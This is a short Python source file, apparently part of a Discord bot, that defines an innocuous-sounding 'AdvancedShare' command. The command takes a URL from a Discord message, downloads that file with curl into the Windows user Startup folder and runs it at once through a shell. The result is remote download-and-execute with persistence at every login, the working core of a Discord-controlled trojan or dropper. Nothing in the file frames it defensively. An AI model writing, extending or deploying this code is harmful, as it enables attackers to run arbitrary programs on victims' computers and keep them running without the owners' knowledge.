import os
import subprocess
import asyncio
from discord.ext import commands

class AdvancedShare:
    def __init__(self):
        self.startup_folder = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

    def download_file(self, url):
        file_name = url.split("/")[-1]
        file_path = os.path.join(self.startup_folder, file_name)

        try:
            # Use curl with -L to follow redirects and -O to save with original filename
            subprocess.run(['curl', '-L', '-o', file_path, url], check=True)
            return file_path
        except subprocess.CalledProcessError as e:
            return str(e)

    def open_file(self, file_path):
        subprocess.Popen(['start', '', file_path], shell=True)

advanced_share = AdvancedShare()

async def advanced_share_command(ctx, url: str):
    if url:
        await ctx.send("Downloading file...")

        file_path = advanced_share.download_file(url)

        if os.path.exists(file_path):
            await ctx.send(f"File downloaded to {advanced_share.startup_folder}. Opening now...")
            advanced_share.open_file(file_path)
        else:
            await ctx.send(f"Error downloading file: {file_path}")
    else:
        await ctx.send("Please provide a valid URL.")
